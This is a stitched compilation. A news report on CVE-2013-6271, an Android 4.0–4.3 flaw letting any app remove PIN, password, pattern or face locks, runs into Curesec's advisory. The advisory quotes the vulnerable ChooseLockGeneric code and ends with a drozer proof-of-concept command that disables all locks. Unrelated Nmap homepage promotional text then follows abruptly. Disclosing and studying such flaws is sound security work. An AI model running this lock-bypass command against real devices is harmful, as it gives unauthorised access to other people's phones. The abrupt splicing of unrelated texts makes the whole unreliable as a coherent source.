## Another day, another vulnerability

Android has taken another step to cement its place behind Java in the world of repeatedly-vulnerable software, with German group Curesec discovering that an attacker can get past users' PINs to unlock the phone.

In fact, the Curesec post [states](https://cureblog.de/2013/11/cve-2013-6271-remove-device-locks-from-android-phone/), the bug – present in Android 4.0 to 4.3 but not 4.4 – exposes any locking technique: PINs, passwords, gestures or facial recognition.

“The bug exists on the 'com.android.settings. ChooseLockGeneric class'. This class is used to allow the user to modify the type of lock mechanism the device should have,” Curesec writes.

A user changing the type of lock they're using should have to enter their previous lock – so if you swap from PIN to gesture, you would have to provide your PIN before Android allows the change.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/front&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z5ScpP9jyF4FcyWCI7WjYQAAAFc&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/front&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z5ScpP9jyF4FcyWCI7WjYQAAAFc&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

The problem is that the program flow in the ChooseLockGeneric class lets an attacker bypass the confirmation:

“We can control the flow to reach the updatePreferencesOrFinish() method and see that IF we provide a Password Type the flow continues to updateUnlockMethodAndFinish(),” the post states. “Above we can see that IF the password is of type PASSWORD\_QUALITY\_UNSPECIFIED the code that gets executed and effectively unblocks the device.

“As a result, any rogue app can at any time remove all existing locks.”

Curesec has proof-of-concept code in its post. The bug has been designated CVE-2013-6271, and Curesec says it decided to go public after the Android Security Team stopped responding to its e-mails about the issue. ®

2. Vulnerability Description

The vulnerability described here enables any rouge app at any time to
remove all existing device locks activated by an user. Curesec disclosed
this vulnerability as Google Android Security Team was not responding
any more about this issue.

The bug exists on the “com.android.settings.ChooseLockGeneric class”.
This class is used to allow the user to modify the type of lock
mechanism the device should have. Android implements several locks, like
pin, password, gesture and even face recognition to lock and unlock a
device. Before a user can change these settings, the device asks the
user for confirmation of the previous lock (e.x. If a user wants to
change the pin or remove it it has to first enter the previou pin).

Lets examine the following code extracted from the class:

      // Defaults to needing to confirm credentials
            <span style="background-color: #21e901;">final boolean
confirmCredentials = getActivity().getIntent()</span>
                <span style="background-color:
#21e901;">.getBooleanExtra(CONFIRM_CREDENTIALS, true);</span>
            <span style="background-color: #21e901;">mPasswordConfirmed
= !confirmCredentials;</span>

            if (savedInstanceState != null) {
                mPasswordConfirmed =
savedInstanceState.getBoolean(PASSWORD_CONFIRMED);
                mWaitingForConfirmation =
savedInstanceState.getBoolean(WAITING_FOR_CONFIRMATION);
                mFinishPending =
savedInstanceState.getBoolean(FINISH_PENDING);
            }

            if (mPasswordConfirmed) {
                <span style="background-color:
#21e901;">updatePreferencesOrFinish</span>();
         }
…...
  private void updatePreferencesOrFinish() {
            Intent intent = getActivity().getIntent();
            int quality =
intent.getIntExtra(LockPatternUtils.PASSWORD_TYPE_KEY, -1);
            if (quality == -1) {
                // If caller didn't specify password quality, show UI
and allow the user to choose.
                quality = intent.getIntExtra(MINIMUM_QUALITY_KEY, -1);
                MutableBoolean allowBiometric = new MutableBoolean(false);
                quality = upgradeQuality(quality, allowBiometric);
                final PreferenceScreen prefScreen = getPreferenceScreen();
                if (prefScreen != null) {
                    prefScreen.removeAll();
                }
                addPreferencesFromResource(R.xml.security_settings_picker);
                disableUnusablePreferences(quality, allowBiometric);
            } else {
                <span style="background-color:
#21e901;">updateUnlockMethodAndFinish</span>(quality, false);
            }
        }

…...
 void updateUnlockMethodAndFinish(int quality, boolean disabled) {
            // Sanity check. We should never get here without confirming
user's existing password.
            if (!mPasswordConfirmed) {
                throw new IllegalStateException("Tried to update
password without confirming it");
            }

            final boolean isFallback = getActivity().getIntent()

.getBooleanExtra(LockPatternUtils.LOCKSCREEN_BIOMETRIC_WEAK_FALLBACK,
false);

            quality = upgradeQuality(quality, null);

            if (quality &gt;=
DevicePolicyManager.PASSWORD_QUALITY_NUMERIC) {
                int minLength = mDPM.getPasswordMinimumLength(null);
                if (minLength &lt; MIN_PASSWORD_LENGTH) {
                    minLength = MIN_PASSWORD_LENGTH;
                }
                final int maxLength =
mDPM.getPasswordMaximumLength(quality);
                Intent intent = new Intent().setClass(getActivity(),
ChooseLockPassword.class);
                intent.putExtra(LockPatternUtils.PASSWORD_TYPE_KEY,
quality);
                intent.putExtra(ChooseLockPassword.PASSWORD_MIN_KEY,
minLength);
                intent.putExtra(ChooseLockPassword.PASSWORD_MAX_KEY,
maxLength);
                intent.putExtra(CONFIRM_CREDENTIALS, false);

intent.putExtra(LockPatternUtils.LOCKSCREEN_BIOMETRIC_WEAK_FALLBACK,
                        isFallback);
                if (isFallback) {
                    startActivityForResult(intent, FALLBACK_REQUEST);
                    return;
                } else {
                    mFinishPending = true;
                    intent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
                    startActivity(intent);
                }
            } else if (quality ==
DevicePolicyManager.PASSWORD_QUALITY_SOMETHING) {
                Intent intent = new Intent(getActivity(),
ChooseLockPattern.class);
                intent.putExtra("key_lock_method", "pattern");
                intent.putExtra(CONFIRM_CREDENTIALS, false);

intent.putExtra(LockPatternUtils.LOCKSCREEN_BIOMETRIC_WEAK_FALLBACK,
                        isFallback);
                if (isFallback) {
                    startActivityForResult(intent, FALLBACK_REQUEST);
                    return;
                } else {
                    mFinishPending = true;
                    intent.addFlags(Intent.FLAG_ACTIVITY_FORWARD_RESULT);
                    startActivity(intent);
                }
            else if (quality ==
DevicePolicyManager.PASSWORD_QUALITY_BIOMETRIC_WEAK) {
                Intent intent = getBiometricSensorIntent();
                mFinishPending = true;
                startActivity(intent);
            } <span style="background-color: #ffff00;">else if (quality
== DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED) {</span>
                <span style="background-color:
#ffff00;">mChooseLockSettingsHelper.utils().clearLock(false);</span>
                <span style="background-color:
#ffff00;">mChooseLockSettingsHelper.utils().setLockScreenDisabled(disabled);</span>
                <span style="background-color:
#ffff00;">getActivity().setResult(Activity.RESULT_OK);</span>
                <span style="background-color: #ffff00;">finish();</span>
            } else {
                finish();
            }
        }

This first piece of code allows the caller to actually control if the
confirmation to change the lock mechanism is enable or not. We can
control the flow to reach the updatePreferencesOrFinish() method and see
that IF we provide a Password Type the flow continues to
updateUnlockMethodAndFinish(). Above we can see that IF the password is
of type PASSWORD_QUALITY_UNSPECIFIED the code that gets executed and
effectively unblocks the device.

As a result any rouge app can at any time remove all existing locks.

3. Proof of Concept Codes

For verification you can use drozer and test the following.

#Disable all phone locks
run app.activity.start --component com.android.settings
com.android.settings.ChooseLockGeneric --extra boolean
confirm_credentials false --extra integer "lockscreen.password_type" 0

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
